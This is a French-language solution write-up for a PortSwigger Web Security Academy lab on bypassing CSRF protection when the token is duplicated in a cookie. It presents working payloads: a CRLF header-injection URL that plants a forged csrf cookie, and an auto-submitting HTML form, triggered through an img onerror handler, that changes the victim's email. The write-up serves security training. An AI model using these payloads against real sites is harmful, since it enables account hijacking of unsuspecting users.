# Lab

https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie

## Solution

Sur le lab on peut modifier l'adresse mail de son compte.

La requête de modification de l'adresse mail est sécurisée par un token CSRF présent dans le body et dans les cookies.

Il y a une première vulnérabilité CSRF puisque le token est vérifié uniquement en faisant la comparaison entre le token du body et le token du cookie.

Ce qui veut dire que si on modifie le cookie CSRF, on peut modifier l'adresse mail du compte en formant un requête POST avec le body suivant :

```html
<form method="POST" action="https://0aa1001804a96a9780928a0a00880042.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything@web-security-academy.net">
    <input type="hidden" name="csrf" value="fake">
</form>
```

En navigant sur le site, on voit que les cookies peuvent être injectés dans les requêtes HTTP via par exemple : `/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None`.

On peut donc injecter le cookie CSRF dans la requête HTTP et modifier l'adresse mail du compte.

```html
<form method="POST" action="https://0aa1001804a96a9780928a0a00880042.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything@web-security-academy.net">
    <input type="hidden" name="csrf" value="fake">
</form>

<img src="https://0aa1001804a96a9780928a0a00880042.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```